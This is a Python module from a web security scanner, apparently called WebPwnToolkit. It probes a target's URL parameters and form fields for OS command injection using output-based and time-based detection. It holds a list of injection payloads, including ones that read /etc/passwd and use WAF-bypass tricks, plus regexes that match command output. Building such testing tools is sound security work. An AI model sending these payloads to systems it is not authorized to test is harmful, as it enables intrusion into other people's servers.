#!/usr/bin/env python3
"""
Command Injection Scanner Module
----------------------------------
Tests for OS Command Injection in:
  • URL GET parameters
  • HTML form fields (POST/GET)
  • Crawled parameterised endpoints

Detection methods:
  • Time-based blind (sleep/ping/timeout)
  • Error-based (shell error strings in response)
  • Output-based (id/whoami/uname output reflection)

Payload file: wordlists/payloads/cmdi.txt
"""

import re
import time
import concurrent.futures
import requests
from bs4 import BeautifulSoup
from pathlib import Path
from urllib.parse import urljoin, urlparse, parse_qs
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn

console = Console()

# ── Fallback hardcoded payloads ───────────────────────────────────────────────
_CMDI_PAYLOADS_FALLBACK = [
    # Output-based
    ";id",
    "|id",
    "||id",
    "&&id",
    "`id`",
    "$(id)",
    ";whoami",
    "|whoami",
    "$(whoami)",
    ";uname -a",
    "|uname -a",
    # Time-based
    "; sleep 3",
    "| sleep 3",
    "|| sleep 3",
    "&& sleep 3",
    "$(sleep 3)",
    "`sleep 3`",
    "; ping -c 3 127.0.0.1",
    # Windows
    ";dir",
    "&dir",
    "&&dir",
    "|dir",
    ";whoami",
    "&whoami",
    "& PING /n 3 127.0.0.1",
    # WAF bypass
    ";$IFS$()id",
    ";{id,}",
    ";c'a't /etc/passwd",
    ";%0aid",
    "%0awhoami",
]

# Patterns indicating successful command execution in response
_CMD_OUTPUT_PATTERNS = [
    # Linux id/whoami output
    r"uid=\d+\([\w]+\)",
    r"root:x:0:0",
    r"daemon:x:",
    r"Linux version \d",
    # Windows
    r"Volume in drive",
    r"NT AUTHORITY\\SYSTEM",
    r"Administrator",
    # Shell errors (can confirm injection point)
    r"sh: \d+:",
    r"command not found",
    r"/bin/sh",
    r"syntax error near unexpected",
]

# Time threshold for sleep-based detection (seconds)
_SLEEP_THRESHOLD = 2.5
_SLEEP_SECONDS = 3


class CMDIScanner:
    """OS Command Injection scanner (output-based + time-based blind)."""

    PAYLOAD_FILE = Path(__file__).parents[2] / "wordlists" / "payloads" / "cmdi.txt"

    def __init__(self, target: str, threads: int = 5, timeout: int = 10, session=None):
        self.target = target.rstrip("/")
        self.threads = threads
        self.timeout = timeout
        if session is not None:
            self.session = session
        else:
            self.session = requests.Session()
            self.session.headers["User-Agent"] = (
                "WebPwnToolkit/2.0 (Authorized Security Testing)"
            )
            self.session.verify = False
        self.results: List[Dict] = []

    # ── Load payloads ─────────────────────────────────────────────────────────

    def _load_payloads(self) -> List[str]:
        """Load from cmdi.txt; skip comments and blanks. Merge with fallback."""
        if self.PAYLOAD_FILE.exists():
            with open(self.PAYLOAD_FILE, encoding="utf-8") as f:
                lines = [
                    l.strip() for l in f if l.strip() and not l.strip().startswith("#")
                ]
            return list(dict.fromkeys(lines + _CMDI_PAYLOADS_FALLBACK))
        return _CMDI_PAYLOADS_FALLBACK

    # ── Test single param + payload ───────────────────────────────────────────

    def _test_payload(
        self, url: str, method: str, params: Dict, field: str, payload: str
    ) -> Optional[Dict]:
        test = params.copy()
        test[field] = payload

        is_time_based = any(
            kw in payload.lower()
            for kw in ["sleep", "ping", "timeout", "waitfor", "benchmark"]
        )

        try:
            t0 = time.time()
            if method == "post":
                resp = self.session.post(
                    url,
                    data=test,
                    timeout=self.timeout + _SLEEP_SECONDS + 2,
                    verify=False,
                )
            else:
                resp = self.session.get(
                    url,
                    params=test,
                    timeout=self.timeout + _SLEEP_SECONDS + 2,
                    verify=False,
                )
            elapsed = time.time() - t0

            body = resp.text

            # ── Output-based detection ────────────────────────────────────
            for pattern in _CMD_OUTPUT_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    return self._make_finding(
                        url,
                        method,
                        field,
                        payload,
                        vuln_type="Command Injection (Output-Based)",
                        evidence=f"Pattern matched: {pattern!r}",
                        severity="critical",
                        cvss=9.8,
                    )

            # ── Time-based blind detection ────────────────────────────────
            if is_time_based and elapsed >= _SLEEP_THRESHOLD:
                return self._make_finding(
                    url,
                    method,
                    field,
                    payload,
                    vuln_type="Command Injection (Time-Based Blind)",
                    evidence=f"Response delayed {elapsed:.2f}s (threshold {_SLEEP_THRESHOLD}s)",
                    severity="high",
                    cvss=8.1,
                )

        except requests.Timeout:
            if is_time_based:
                return self._make_finding(
                    url,
                    method,
                    field,
                    payload,
                    vuln_type="Command Injection (Time-Based Blind)",
                    evidence="Request timed out — possible sleep injection",
                    severity="high",
                    cvss=8.1,
                )
        except Exception:
            pass
        return None

    @staticmethod
    def _make_finding(
        url, method, field, payload, vuln_type, evidence, severity, cvss
    ) -> Dict:
        return {
            "url": url,
            "method": method.upper(),
            "parameter": field,
            "payload": payload,
            "type": vuln_type,
            "severity": severity,
            "evidence": evidence,
            "detail": (f"Parameter '{field}' is injectable — " f"payload: {payload!r}"),
            "owasp": "A03:2021 – Injection",
            "cvss": cvss,
            "remediation": (
                "Never pass user-supplied input to shell commands. "
                "Use parameterised APIs (subprocess with list args). "
                "Apply strict allowlist validation on all inputs."
            ),
        }

    # ── Collect injectable params ─────────────────────────────────────────────

    def _collect_params(self) -> List[Dict]:
        """Gather URL params + form fields from target page."""
        params = []

        # URL query params
        parsed = urlparse(self.target)
        qs = parse_qs(parsed.query)
        for key in qs:
            params.append(
                {
                    "type": "get",
                    "url": self.target,
                    "field": key,
                    "others": {k: v[0] for k, v in qs.items()},
                }
            )

        # Form fields
        try:
            resp = self.session.get(self.target, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(resp.text, "lxml")
            for form in soup.find_all("form"):
                action = urljoin(self.target, form.get("action", ""))
                method = form.get("method", "get").lower()
                fields = {
                    i.get("name"): i.get("value", "")
                    for i in form.find_all("input")
                    if i.get("name")
                    and i.get("type", "text") not in ("submit", "button")
                }
                for name in fields:
                    params.append(
                        {
                            "type": method,
                            "url": action or self.target,
                            "field": name,
                            "others": fields,
                        }
                    )
        except Exception:
            pass

        return params

    # ── Public run ────────────────────────────────────────────────────────────

    def run(self) -> List[Dict]:
        payloads = self._load_payloads()
        params = self._collect_params()

        console.print(f"  [dim]-> {len(payloads)} CMDi payloads loaded[/dim]")
        console.print(f"  [dim]-> {len(params)} injectable parameter(s) found[/dim]")

        all_tests = [
            (p["url"], p["type"], p["others"], p["field"], payload)
            for p in params
            for payload in payloads
        ]

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]CMDi scanning...[/cyan]"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:
            task = progress.add_task("cmdi", total=max(len(all_tests), 1))
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = {
                    ex.submit(self._test_payload, *args): args for args in all_tests
                }
                for future in concurrent.futures.as_completed(futures):
                    progress.advance(task)
                    result = future.result()
                    if result and result not in self.results:
                        self.results.append(result)

        console.print(
            f"  [{'red' if self.results else 'green'}]"
            f"{'⚠ ' + str(len(self.results)) + ' Command Injection issue(s) found!' if self.results else '✅ No CMDi found'}"
            f"[/]"
        )
        return self.results
